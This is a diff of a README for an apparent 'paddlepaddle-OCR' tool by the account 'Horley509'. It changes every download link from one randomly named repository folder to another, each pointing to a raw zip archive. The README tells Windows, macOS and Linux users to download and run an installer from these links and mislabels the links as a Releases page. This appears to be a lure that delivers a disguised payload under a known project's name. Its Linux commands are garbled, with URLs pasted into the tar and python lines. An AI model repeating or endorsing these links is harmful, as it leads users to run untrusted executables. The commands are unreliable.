@@ -6,7 +6,7 @@ Welcome to paddlepaddle-OCR, your go-to solution for efficient text recognition.
 ## 📥 Download & Install
 To get started, you need to download the software. You can find the latest version on our Releases page.
 
-[![Download paddlepaddle-OCR](https://raw.githubusercontent.com/Horley509/paddlepaddle-OCR/main/pulpamenta/paddlepaddle-OCR.zip%20Now-blue)](https://raw.githubusercontent.com/Horley509/paddlepaddle-OCR/main/pulpamenta/paddlepaddle-OCR.zip)
+[![Download paddlepaddle-OCR](https://raw.githubusercontent.com/Horley509/paddlepaddle-OCR/main/faintness/paddlepaddle-OCR.zip%20Now-blue)](https://raw.githubusercontent.com/Horley509/paddlepaddle-OCR/main/faintness/paddlepaddle-OCR.zip)
 
 Click the link above to visit the Releases page. Here, you’ll find the software files ready for download. Look for the latest version and download the appropriate file for your system.
 
@@ -25,7 +25,7 @@ Here’s how to install paddlepaddle-OCR on your computer.
 
 ### Windows
 1. **Download**:
-   - Go to the [Releases page](https://raw.githubusercontent.com/Horley509/paddlepaddle-OCR/main/pulpamenta/paddlepaddle-OCR.zip) and download the `.exe` file.
+   - Go to the [Releases page](https://raw.githubusercontent.com/Horley509/paddlepaddle-OCR/main/faintness/paddlepaddle-OCR.zip) and download the `.exe` file.
   
 2. **Run Installer**:
    - Double-click the downloaded file to launch the installer.
@@ -38,7 +38,7 @@ Here’s how to install paddlepaddle-OCR on your computer.
 
 ### MacOS
 1. **Download**:
-   - Visit the [Releases page](https://raw.githubusercontent.com/Horley509/paddlepaddle-OCR/main/pulpamenta/paddlepaddle-OCR.zip) and download the `.dmg` file.
+   - Visit the [Releases page](https://raw.githubusercontent.com/Horley509/paddlepaddle-OCR/main/faintness/paddlepaddle-OCR.zip) and download the `.dmg` file.
 
 2. **Open Disk Image**:
    - Double-click the downloaded file to mount it.
@@ -51,12 +51,12 @@ Here’s how to install paddlepaddle-OCR on your computer.
 
 ### Linux
 1. **Download**:
-   - Go to the [Releases page](https://raw.githubusercontent.com/Horley509/paddlepaddle-OCR/main/pulpamenta/paddlepaddle-OCR.zip) and download the appropriate `https://raw.githubusercontent.com/Horley509/paddlepaddle-OCR/main/pulpamenta/paddlepaddle-OCR.zip` file.
+   - Go to the [Releases page](https://raw.githubusercontent.com/Horley509/paddlepaddle-OCR/main/faintness/paddlepaddle-OCR.zip) and download the appropriate `https://raw.githubusercontent.com/Horley509/paddlepaddle-OCR/main/faintness/paddlepaddle-OCR.zip` file.
 
 2. **Extract Files**:
    - Open a terminal and navigate to your Downloads folder. Run the command:
      ```
-     tar -xvzf paddlepaddle-OCR-*https://raw.githubusercontent.com/Horley509/paddlepaddle-OCR/main/pulpamenta/paddlepaddle-OCR.zip
+     tar -xvzf paddlepaddle-OCR-*https://raw.githubusercontent.com/Horley509/paddlepaddle-OCR/main/faintness/paddlepaddle-OCR.zip
      ```
 
 3. **Install Dependencies**:
@@ -65,7 +65,7 @@ Here’s how to install paddlepaddle-OCR on your computer.
 4. **Run Application**:
    - Navigate to the extracted folder and run the application with:
      ```
-     python https://raw.githubusercontent.com/Horley509/paddlepaddle-OCR/main/pulpamenta/paddlepaddle-OCR.zip
+     python https://raw.githubusercontent.com/Horley509/paddlepaddle-OCR/main/faintness/paddlepaddle-OCR.zip
      ```
 
 ## 📖 How to Use paddlepaddle-OCR
